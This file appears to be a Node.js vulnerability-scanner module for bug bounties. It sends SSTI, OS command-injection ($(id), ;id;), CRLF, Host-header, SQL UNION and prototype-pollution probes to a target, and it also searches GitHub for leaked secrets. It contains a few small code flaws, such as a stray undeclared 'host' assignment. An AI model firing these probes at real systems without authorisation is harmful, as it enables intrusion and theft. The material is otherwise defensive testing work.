/**
 * Big Bounty Red-Team Module — the checks pro hackers run that scanners skip.
 * Serverless-safe: pure HTTP/DNS/TLS, no binaries. Every finding = live evidence.
 */
const tls = require('tls');
const dns = require('dns').promises;
const { makeFinding } = require('./attacks');

// const host removed (was duplicate declaration)
function fid() { return 'rt-' + Math.random().toString(36).slice(2, 10); }

async function pLimit(items, n, fn) {
  const out = []; let i = 0;
  const workers = Array(Math.min(n, items.length)).fill(0).map(async () => {
    while (i < items.length) { const idx = i++; try { out[idx] = await fn(items[idx]); } catch {} }
  });
  await Promise.all(workers);
  return out.filter(Boolean);
}

function timeoutFetch(url, opts = {}, ms = 8000) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  return fetch(url, { ...opts, signal: c.signal, redirect: 'manual' }).finally(() => clearTimeout(t));
}

async function get(url, opts = {}, ms = 8000) {
  try {
    const r = await timeoutFetch(url, opts, ms);
    const body = await r.text().catch(() => '');
    return { status: r.status, headers: r.headers, body };
  } catch (e) { return { status: 0, headers: new Headers(), body: '', error: e.message }; }
}

// ---------- 1. SSTI (server-side template injection) ----------
async function ssti(url) {
  const out = [];
  const marks = [
    { p: '{{7*7}}', e: '49', eng: 'Jinja2/Twig' },
    { p: '${7*7}', e: '49', eng: 'Freemarker/Spring' },
    { p: '<%= 7*7 %>', e: '49', eng: 'ERB' },
    { p: '#{7*7}', e: '49', eng: 'Ruby/Slim' },
    { p: '{{7*\'7\'}}', e: '7777777', eng: 'Jinja2 (str)' },
  ];
  const u = new URL(url);
  if (!u.search || [...u.searchParams.keys()].length === 0) {
    u.searchParams.set('bbx', marks[0].p); // probe one param anyway
  }
  const keys = [...u.searchParams.keys()].slice(0, 3);
  const base = u.toString();
  const tasks = [];
  for (const k of keys) {
    for (const m of marks) {
      const t = new URL(base); t.searchParams.set(k, m.p);
      tasks.push({ testUrl: t.toString(), param: k, ...m });
    }
  }
  await pLimit(tasks, 6, async (t) => {
    const r = await get(t.testUrl, {}, 7000);
    // Eval evidence: response has the computed result but NOT the raw template syntax
    // (raw-syntax reflection = plain echo, not injection)
    if (r.status === 200 && r.body.includes(t.e) && !r.body.includes(t.p)) {
        out.push(makeFinding({
          tool: 'ssti', severity: 'critical',
          title: `Server-Side Template Injection (${t.eng}) via "${t.param}"`,
          evidence: { url: t.testUrl, param: t.param, marker: t.p, evaluated: t.e, engine: t.eng },
          curl: `curl -sk '${t.testUrl}'  # response contains '${t.e}' but control does not`,
          fix: 'Never render user input through template engines; use data binding instead of string templates.',
        }));
      }
  });
  return out;
}

// ---------- 2. OS command injection (safe markers only) ----------
async function cmdInjection(url) {
  const out = [];
  const probes = [
    { p: ';id;', sig: /uid=\d+\(/, name: ';id; (unix)' },
    { p: '$(id)', sig: /uid=\d+\(/, name: '$(id) (unix)' },
    { p: '`id`', sig: /uid=\d+\(/, name: '`id` (unix)' },
    { p: '&id&', sig: /uid=\d+\(/, name: '&id& (unix)' },
    { p: '|id', sig: /uid=\d+\(/, name: '|id (unix)' },
  ];
  const u = new URL(url);
  if (![...u.searchParams.keys()].length) u.searchParams.set('bbx', 'x');
  const keys = [...u.searchParams.keys()].slice(0, 3);
  const tasks = [];
  for (const k of keys) {
    for (const pr of probes) {
      const t = new URL(u.toString()); t.searchParams.set(k, pr.p);
      tasks.push({ testUrl: t.toString(), param: k, ...pr });
    }
  }
  await pLimit(tasks, 6, async (t) => {
    const r = await get(t.testUrl, {}, 8000);
    if (r.status === 200 && t.sig.test(r.body)) {
      out.push(makeFinding({
        tool: 'cmd-injection', severity: 'critical',
        title: `OS Command Injection via "${t.param}" (${t.name})`,
        evidence: { url: t.testUrl, param: t.param, marker: t.p, responseMatch: (r.body.match(t.sig) || ['uid=...'])[0] },
        curl: `curl -sk '${t.testUrl}'  # response contains uid=... output`,
        fix: 'Never pass user input to shell/system calls; use language APIs and strict allow-lists.',
      }));
    }
  });
  return out;
}

// ---------- 3. CRLF injection (response splitting / header injection) ----------
async function crlf(url) {
  const out = [];
  const u = new URL(url);
  const probes = [
    { p: '%0d%0aX-BBX-Injected:%201', h: 'x-bbx-injected', v: '1' },
    { p: '%0d%0a%0d%0a<script>alert(1)</script>', body: '<script>alert(1)</script>' },
  ];
  const tasks = [];
  const pathBase = u.origin + (u.pathname === '/' ? '' : u.pathname);
  for (const pr of probes) tasks.push({ testUrl: `${pathBase}/%0d%0a${pr.p.replace(/%0d%0a/, '')}`, ...pr });
  await pLimit(tasks, 4, async (t) => {
    const r = await get(t.testUrl, {}, 7000);
    let hit = null;
    if (t.h && r.headers.get(t.h)) hit = { type: 'header', header: t.h, value: r.headers.get(t.h) };
    if (t.body && r.body.includes(t.body)) hit = { type: 'body', snippet: r.body.slice(0, 120) };
    if (hit) {
      out.push(makeFinding({
        tool: 'crlf', severity: 'high',
        title: 'CRLF Injection — response header/body split accepted',
        evidence: { url: t.testUrl, ...hit },
        curl: `curl -skI '${t.testUrl}'`,
        fix: 'Sanitize %0d/%0a from URLs; encode redirects; disable raw header reflection.',
      }));
    }
  });
  return out;
}

// ---------- 4. Host-header injection / web-cache poisoning hint ----------
async function hostHeaderInjection(url) {
  const out = [];
  const u = new URL(url);
  const evil = 'bbx-' + Math.random().toString(36).slice(2, 8) + '.evil.example';
  const variants = [
    { name: 'Host replaced', headers: { Host: u.host === undefined ? u.hostname : new URL(url).host } },
    { name: 'X-Forwarded-Host', headers: { 'X-Forwarded-Host': evil } },
    { name: 'X-Host', headers: { 'X-Host': evil } },
    { name: 'X-Forwarded-Proto https + XFH', headers: { 'X-Forwarded-Host': evil, 'X-Forwarded-Proto': 'https' } },
  ];
  for (const v of variants) {
    try {
      const r = await timeoutFetch(url, { headers: v.headers }, 8000);
      const body = await r.text().catch(() => '');
      if (body.includes(evil)) {
        out.push(makeFinding({
          tool: 'host-header', severity: 'high',
          title: `Host header injection reflected via ${v.name}`,
          evidence: { sent: v.headers, reflectedInBody: true, marker: evil, snippet: body.slice(Math.max(0, body.indexOf(evil) - 60), body.indexOf(evil) + 80) },
          curl: `curl -sk '${url}' -H 'X-Forwarded-Host: ${evil}' | grep -F '${evil}'`,
          fix: 'Use a fixed absolute-URL base; never derive links/cache keys from client-controlled headers.',
        }));
      }
    } catch {}
  }
  return out;
}

// ---------- 5. Cookie flag audit on the main response ----------
async function cookieAudit(url) {
  const out = [];
  try {
    const r = await timeoutFetch(url, {}, 9000);
    const setCookies = typeof r.headers.getSetCookie === 'function' ? r.headers.getSetCookie() : [r.headers.get('set-cookie')].filter(Boolean);
    for (const sc of setCookies) {
      const name = sc.split('=')[0].trim();
      const isSession = /sess|auth|token|jwt|sid|login/i.test(name);
      const flags = {
        httpOnly: /httponly/i.test(sc),
        secure: /secure/i.test(sc),
        sameSite: (sc.match(/samesite=(\w+)/i) || [])[1] || null,
      };
      const problems = [];
      if (isSession && !flags.httpOnly) problems.push('session cookie without HttpOnly (stealable via XSS)');
      if (!flags.secure) problems.push('missing Secure flag');
      if (isSession && !flags.sameSite) problems.push('no SameSite (CSRF surface)');
      if (problems.length) {
        out.push(makeFinding({
          tool: 'cookies', severity: isSession ? 'medium' : 'low',
          title: `Cookie "${name}" misconfigured — ${problems.length} issue(s)`,
          evidence: { cookie: name, sessionCookie: isSession, flags, problems },
          curl: `curl -skI '${url}' | grep -i set-cookie`,
          fix: 'Set HttpOnly; Secure; SameSite=Lax (or Strict) on all session cookies.',
        }));
      }
    }
  } catch {}
  return out;
}

// ---------- 6. WAF / edge fingerprint (wafw00f-style) ----------
async function wafFingerprint(url) {
  const out = [];
  const sigs = [
    { n: 'Cloudflare', h: { 'server': /cloudflare/i }, b: [/Attention Required/, /cf-ray/i] },
    { n: 'AWS WAF', b: [/Request blocked.*AWS WAF/, /ERROR: The request could not be satisfied/] },
    { n: 'Akamai', b: [/Access Denied.*Akamai/, /akamai-ref/] },
    { n: 'Sucuri', b: [/Sucuri WebSite Firewall/] },
    { n: 'Imperva', b: [/Powered by Imperva/, /Incapsula/] },
    { n: 'ModSecurity', b: [/Mod_Security/, /ModSecurity/] },
    { n: 'Vercel', h: { 'x-vercel-id': /./ } },
    { n: 'GitHub Pages', h: { 'server': /GitHub\.com/i } },
  ];
  const probeUrl = url.replace(/\/$/, '') + '/?' + 'bbx=' + 'UNION%20SELECT%20*%20FROM%20users--';
  const r = await get(probeUrl, {}, 8000);
  const headerPairs = [...r.headers.entries()];
  for (const s of sigs) {
    let hit = null;
    if (s.h) for (const [k, v] of headerPairs) { if (s.h[k] && s.h[k].test(v)) { hit = { kind: 'header', header: k, value: v }; break; } }
    if (!hit && s.b) for (const re of s.b) { if (re.test(r.body)) { hit = { kind: 'body', matched: re.source.slice(0, 40) }; break; } }
    if (hit) {
      out.push(makeFinding({
        tool: 'waf', severity: 'info',
        title: `Edge/WAF detected: ${s.n}`,
        evidence: { detection: hit, note: 'Attacker now knows which bypass class applies (e.g. origin-IP discovery for Cloudflare).' },
        fix: null,
      }));
      break; // first strong match is enough
    }
  }
  return out;
}

// ---------- 7. SPF / DMARC — email spoofing risk ----------
async function emailSpoof(hostname) {
  const out = [];
  host = hostname;
  async function txt(name) { try { return (await dns.resolveTxt(name)).map(r => r.join('')); } catch { return []; } }
  const [spf, dmarc] = await Promise.all([txt(hostname), txt(`_dmarc.${hostname}`)]);
  const spfRec = spf.find(r => /^v=spf1/i.test(r));
  if (!spfRec) {
    out.push(makeFinding({
      tool: 'email-security', severity: 'medium',
      title: `No SPF record for ${hostname} — anyone can spoof email from this domain`,
      evidence: { domain: hostname, spf: null, impact: 'Phishing emails appear to come from your domain.' },
      curl: `dig TXT ${hostname} +short`,
      fix: 'Publish v=spf1 (e.g. "v=spf1 include:_spf.google.com -all").',
    }));
  } else if (/\?all|(\+all)/i.test(spfRec)) {
    out.push(makeFinding({
      tool: 'email-security', severity: 'medium',
      title: `SPF uses ?all/+all — SPF effectively disabled for ${hostname}`,
      evidence: { spf: spfRec },
      fix: 'End SPF with -all (hard fail).',
    }));
  }
  if (!dmarc.length) {
    out.push(makeFinding({
      tool: 'email-security', severity: 'medium',
      title: `No DMARC policy for ${hostname}`,
      evidence: { domain: hostname, dmarc: null, impact: 'Receivers cannot enforce policy on spoofed mail.' },
      curl: `dig TXT _dmarc.${hostname} +short`,
      fix: 'Publish "_dmarc" TXT: v=DMARC1; p=quarantine; rua=mailto:dmarc@domain.',
    }));
  }
  return out;
}

// ---------- 8. TLS certificate audit ----------
function tlsAudit(hostname) {
  return new Promise((resolve) => {
    const out = [];
    const socket = tls.connect({ host: hostname, port: 443, servername: hostname, timeout: 8000, rejectUnauthorized: false }, () => {
      const cert = socket.getPeerCertificate(false);
      if (cert && cert.valid_to) {
        const expiry = new Date(cert.valid_to);
        const days = Math.floor((expiry - Date.now()) / 86400000);
        const issuer = (cert.issuer && (cert.issuer.O || cert.issuer.CN)) || 'unknown';
        if (days < 0) out.push(makeFinding({ tool: 'tls', severity: 'critical', title: `TLS certificate EXPIRED ${-days} days ago`, evidence: { expiry: expiry.toISOString().slice(0, 10), issuer }, fix: 'Renew certificate immediately.' }));
        else if (days < 14) out.push(makeFinding({ tool: 'tls', severity: 'high', title: `TLS certificate expires in ${days} days`, evidence: { expiry: expiry.toISOString().slice(0, 10), issuer }, fix: 'Renew certificate; enable auto-renewal.' }));
        else out.push(makeFinding({ tool: 'tls', severity: 'info', title: `TLS certificate valid (${issuer}), ${days} days left`, evidence: { expiry: expiry.toISOString().slice(0, 10), issuer, subject: cert.subject && cert.subject.CN } }));
        if (cert.issuer && cert.issuer.O === 'self') out.push(makeFinding({ tool: 'tls', severity: 'medium', title: 'Self-signed certificate', evidence: { issuer } }));
      }
      socket.end(); resolve(out);
    });
    socket.on('error', () => resolve(out));
    socket.on('timeout', () => { socket.destroy(); resolve(out); });
  });
}

// ---------- 9. Wayback Machine — historically exposed sensitive URLs ----------
async function wayback(url) {
  const out = [];
  try {
    const u = new URL(url);
    const api = `https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(u.origin + '/*')}&output=json&collapse=urlkey&filter=statuscode:200&limit=300`;
    const r = await get(api, {}, 12000);
    if (r.status === 200 && r.body.startsWith('[')) {
      const rows = JSON.parse(r.body);
      const urls = rows.slice(1).map(row => row[2]);
      const interesting = urls.filter(x => /\.(sql|zip|bak|backup|old|env|conf|ini|log|tar|gz|7z|dump|swp|json|yml|yaml)$/i.test(x.split('?')[0]) || /\/(\.env|\.git\/|phpinfo|admin\.php|config\.php|wp-config|database\.yml)/i.test(x));
      const seen = new Set();
      const uniq = interesting.filter(x => { const k = x.split('?')[0]; if (seen.has(k)) return false; seen.add(k); return true; }).slice(0, 10);
      if (uniq.length) {
        out.push(makeFinding({
          tool: 'wayback', severity: 'low',
          title: `${uniq.length} historically-exposed sensitive URL(s) in Wayback Machine`,
          evidence: { urls: uniq, note: 'These were reachable at some point — check they are gone AND unindexed.' },
          curl: `curl -s 'https://web.archive.org/cdx/search/cdx?url=${u.origin}/*&output=json&limit=50'`,
          fix: 'Remove leaked archives/backups from origin; they stay queryable forever once crawled.',
        }));
      }
    }
  } catch {}
  return out;
}

// ---------- 10. Prototype pollution probe ----------
async function protoPollution(url) {
  const out = [];
  const u = new URL(url);
  const probes = [
    { q: '__proto__[bbxp]=1', check: 'bbxp' },
    { q: 'constructor[prototype][bbxp]=1', check: 'bbxp' },
    { q: '__proto__=bbxp1', check: null },
  ];
  for (const pr of probes.slice(0, 2)) {
    const t = new URL(url); t.search = pr.q;
    const r = await get(t.toString(), {}, 7000);
    if (r.status === 200 && /__proto__|prototype pollution|deepMerge/i.test(r.body)) {
      out.push(makeFinding({
        tool: 'proto-pollution', severity: 'medium',
        title: 'Prototype-pollution style input reflected/merged unsafely (client-side hint)',
        evidence: { url: t.toString(), probe: pr.q, responseHint: (r.body.match(/.{0,50}(__proto__|prototype pollution|deepMerge).{0,50}/) || [''])[0] },
        fix: 'Use Object.create(null) maps or validated schemas for merge operations.',
      }));
    }
  }
  return out;
}

// ---------- 11. GitHub public code leak (unauthenticated search) ----------
async function githubLeaks(hostname) {
  const out = [];
  try {
    const org = hostname.replace(/^www\./, '').split('.')[0];
    const q = encodeURIComponent(`"${hostname}" (api_key OR apikey OR secret OR password OR token OR BEGIN PRIVATE KEY)`);
    const r = await get(`https://api.github.com/search/code?q=${q}&per_page=10`, {
      headers: { 'Accept': 'application/vnd.github+json', 'User-Agent': 'big-bounty-scan' },
    }, 10000);
    if (r.status === 200) {
      const d = JSON.parse(r.body);
      const items = (d.items || []).slice(0, 5).map(i => ({ repo: i.repository.full_name, path: i.path, url: i.html_url }));
      if (items.length) {
        out.push(makeFinding({
          tool: 'github-leaks', severity: 'high',
          title: `${items.length} public GitHub file(s) mention secrets near "${hostname}"`,
          evidence: { results: items, note: 'GitHub code search without auth is partial — run an authenticated org-wide secret scan for full coverage.' },
          curl: `https://github.com/search?q=${q}&type=code`,
          fix: 'Revoke and rotate any exposed credentials; purge files via git filter-repo; enable push protection.',
        }));
      }
    }
  } catch {}
  return out;
}

// ---------- orchestrator ----------
async function runRedTeam({ url, hostname, deadline = Date.now() + 120000 }) {
  const all = [];
  const steps = [
    ['ssti', () => ssti(url)],
    ['cmd-injection', () => cmdInjection(url)],
    ['crlf', () => crlf(url)],
    ['host-header', () => hostHeaderInjection(url)],
    ['cookies', () => cookieAudit(url)],
    ['waf', () => wafFingerprint(url)],
    ['email-spoof', () => emailSpoof(hostname)],
    ['tls', () => tlsAudit(hostname)],
    ['wayback', () => wayback(url)],
    ['proto-pollution', () => protoPollution(url)],
    ['github-leaks', () => githubLeaks(hostname)],
  ];
  for (const [name, fn] of steps) {
    if (Date.now() > deadline) break;
    try { all.push(...(await fn() || [])); } catch {}
  }
  return all;
}

module.exports = { runRedTeam };
